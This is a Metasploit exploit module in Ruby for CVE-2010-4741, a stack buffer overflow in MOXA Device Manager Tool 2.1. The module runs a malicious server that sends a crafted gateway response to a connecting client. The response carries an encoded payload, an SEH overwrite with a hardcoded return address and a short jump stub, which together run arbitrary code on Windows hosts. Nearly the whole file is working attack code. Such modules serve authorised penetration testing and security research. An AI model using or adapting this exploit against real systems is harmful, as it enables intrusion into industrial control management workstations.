##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = GreatRanking

  include Msf::Exploit::Remote::TcpServer
  include Msf::Exploit::Remote::Seh

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'MOXA Device Manager Tool 2.1 Buffer Overflow',
      'Description'    => %q{
          This module exploits a stack buffer overflow in MOXA MDM Tool 2.1.
        When sending a specially crafted MDMGw (MDM2_Gateway) response, an
        attacker may be able to execute arbitrary code.
      },
      'Author'         => [ 'Ruben Santamarta', 'MC' ],
      'License'        => MSF_LICENSE,
      'References'     =>
        [
          [ 'CVE', '2010-4741'],
          [ 'OSVDB', '69027'],
          [ 'URL', 'http://www.reversemode.com/index.php?option=com_content&task=view&id=70&Itemid=' ],
          [ 'URL', 'https://www.cisa.gov/uscert/ics/advisories/ICSA-10-301-01A' ]
        ],
      'DefaultOptions' =>
        {
          'EXITFUNC' => 'thread',
          'InitialAutoRunScript' => 'post/windows/manage/priv_migrate'
        },
      'Payload'        =>
        {
          'Space'    => 600,
          'BadChars' => "\x00\x0a\x0d\x20",
          'StackAdjustment' => -3500
        },
      'Platform'       => 'win',
      'Targets'        =>
        [
          [ 'MOXA MDM Tool 2.1', { 'Ret' => 0x1016bca7 } ], # UTU.dll / keeping the rop version for me...
        ],
      'Privileged'     => false,
      'DisclosureDate' => '2010-10-20',
      'DefaultTarget'  => 0))

    register_options(
      [
        OptPort.new('SRVPORT', [ true, "The daemon port to listen on.", 54321 ])
      ])
  end

  def on_client_connect(client)

    return if ((p = regenerate_payload(client)) == nil)

    client.get_once

    sploit = rand_text_alpha_upper(18024)

    sploit[0, 4] = [0x29001028].pack('V')
    sploit[472, payload.encoded.length] = payload.encoded
    sploit[1072, 8] = generate_seh_record(target.ret)
    sploit[1080, 5] = Metasm::Shellcode.assemble(Metasm::Ia32.new, "call $-550").encode_string

    client.put(sploit)

    handler(client)

    service.close_client(client)

  end
end
